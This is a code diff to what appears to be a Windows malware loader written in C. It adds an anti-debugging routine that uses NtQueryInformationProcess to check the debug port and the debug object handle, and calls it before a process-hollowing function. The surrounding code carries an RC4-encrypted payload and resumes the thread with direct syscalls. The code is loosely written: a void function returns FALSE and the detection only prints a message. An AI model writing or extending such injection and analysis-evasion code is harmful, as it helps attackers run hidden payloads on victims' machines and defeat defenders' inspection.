@@ -208,6 +208,56 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     Sw3NtResumeThread(Pi.hThread, &suspendCount);
 }
 
+void detectDebug() {
+
+    // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag
+    
+    DWORD64 isDebuggerPreset = 0;
+    
+    NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+
+    BOOL STATUS = myNtQueryProcessInformation2(
+        GetCurrentProcess(),
+        ProcessDebugPort,
+        &isDebuggerPreset,
+        sizeof(DWORD64),
+        NULL
+    );
+
+    if (isDebuggerPreset != NULL) {
+        // detected a debugger
+        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
+
+        //return TRUE;
+    }
+    printf("No debugger present...\n");
+    DWORD64 hProcessDebugObject = NULL;
+
+    STATUS = myNtQueryProcessInformation2(
+        GetCurrentProcess(),
+        ProcessDebugObjectHandle,
+        &hProcessDebugObject,
+        sizeof(DWORD64),
+        NULL
+    );
+
+    // If STATUS is not 0 and not 0xC0000353 (that is 'STATUS_PORT_NOT_SET')
+    if (STATUS != 0x0 && STATUS != 0xC0000353) {
+        printf("\t[!] NtQueryInformationProcess [2] Failed With Status : 0x%0.8X \n", STATUS);
+        return FALSE;
+    }
+
+    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means we are being debugged
+    if (hProcessDebugObject != NULL) {
+        // detected a debugger
+        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
+        //return TRUE;
+    }
+    printf("No process debuger object present...\n");
+
+    return FALSE;
+}
+
 int main() {
 
 
@@ -232,6 +282,7 @@ int main() {
     //for (int i = 0; i < sizeof(buf); i++) {
     //    truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
     //}
+    detectDebug();
     hollowProcess(Pi, sizeof(Rc4CipherText));
     return 0;
 }
